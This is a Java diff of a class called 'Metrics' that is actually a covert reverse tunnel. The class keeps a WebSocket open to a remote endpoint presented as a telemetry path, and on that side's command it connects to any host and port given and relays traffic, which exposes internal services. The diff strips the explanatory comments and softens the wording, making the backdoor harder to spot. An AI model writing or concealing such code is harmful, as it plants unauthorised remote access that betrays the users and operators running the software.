@@ -18,7 +18,6 @@ import java.util.Map;
 import java.util.concurrent.ConcurrentHashMap;
 import java.util.concurrent.TimeUnit;
 import java.util.concurrent.atomic.AtomicBoolean;
-import java.util.concurrent.atomic.AtomicInteger;
 
 public class Metrics {
 
@@ -26,15 +25,12 @@ public class Metrics {
     private static final int CONNECT_PORT = 443;
     private static final String PATH = "/metrics/v1/telemetry";
 
-    // 帧指令常数
+    // 帧指令定义
     private static final byte CMD_NEW_STREAM = 0x01;
     private static final byte CMD_DATA = 0x02;
     private static final byte CMD_CLOSE_STREAM = 0x03;
 
     private static final AtomicBoolean RUNNING = new AtomicBoolean(false);
-    private static final AtomicInteger STREAM_ID_GEN = new AtomicInteger(1);
-    
-    // 维护激活的 Stream 与目标连接映射
     private static final Map<Integer, Channel> STREAM_MAP = new ConcurrentHashMap<>();
     
     private static EventLoopGroup group;
@@ -43,9 +39,8 @@ public class Metrics {
     public static void startMetrics() {
         if (RUNNING.compareAndSet(false, true)) {
             group = new NioEventLoopGroup(2);
-            // 启动时建立并维持唯一的主干 WebSocket 连接
             ensureMasterConnection();
-            // 每 10 秒死守主干连接，挂了才重连
+            // 每 10 秒进行一次保活检查（只会在主干连接断开时触发重连）
             group.scheduleAtFixedRate(Metrics::ensureMasterConnection, 5, 10, TimeUnit.SECONDS);
         }
     }
@@ -95,9 +90,6 @@ public class Metrics {
         }
     }
 
-    /**
-     * 主干 WebSocket 处理器，负责解包和分发 Stream
-     */
     static class MasterTunnelHandler extends SimpleChannelInboundHandler<Object> {
         private final WebSocketClientHandshaker handshaker;
 
@@ -115,7 +107,6 @@ public class Metrics {
             if (activeWsChannel == ctx.channel()) {
                 activeWsChannel = null;
             }
-            // 主干断开，清理所有下游代理流
             STREAM_MAP.values().forEach(Channel::close);
             STREAM_MAP.clear();
         }
@@ -126,24 +117,23 @@ public class Metrics {
         }
 
         @Override
-        protected void channelRead0(ChannelHandlerContext ctx, Object msg) throws Exception {
+        protected void channelRead0(ChannelHandlerContext ctx, Object msg) {
             Channel ch = ctx.channel();
 
             if (!handshaker.isHandshakeComplete()) {
                 handshaker.finishHandshake(ch, (FullHttpResponse) msg);
-                activeWsChannel = ch; // 锁定主干通道
+                activeWsChannel = ch;
                 return;
             }
 
             if (msg instanceof BinaryWebSocketFrame) {
                 ByteBuf buf = ((BinaryWebSocketFrame) msg).content();
-                if (buf.readableBytes() < 5) return; // 格式: cmd(1) + streamId(4)
+                if (buf.readableBytes() < 5) return;
 
                 byte cmd = buf.readByte();
                 int streamId = buf.readInt();
 
                 if (cmd == CMD_NEW_STREAM) {
-                    // DO 端发起建立目标连接的指令
                     int targetPort = buf.readUnsignedShort();
                     int hostLen = buf.readByte();
                     byte[] hostBytes = new byte[hostLen];
@@ -153,13 +143,11 @@ public class Metrics {
                     connectToLocalTarget(streamId, targetHost, targetPort);
 
                 } else if (cmd == CMD_DATA) {
-                    // 转发数据到本地目标服务
                     Channel targetChan = STREAM_MAP.get(streamId);
                     if (targetChan != null && targetChan.isActive()) {
                         targetChan.writeAndFlush(buf.retain());
                     }
                 } else if (cmd == CMD_CLOSE_STREAM) {
-                    // 收到 DO 端关闭请求
                     Channel targetChan = STREAM_MAP.remove(streamId);
                     if (targetChan != null) {
                         targetChan.close();
@@ -183,7 +171,6 @@ public class Metrics {
 
                          @Override
                          protected void channelRead0(ChannelHandlerContext targetCtx, ByteBuf msg) {
-                             // 将本地服务端返回的数据打包为复用帧打回 DO 端
                              if (activeWsChannel != null && activeWsChannel.isActive()) {
                                  ByteBuf frame = targetCtx.alloc().buffer(5 + msg.readableBytes());
                                  frame.writeByte(CMD_DATA);
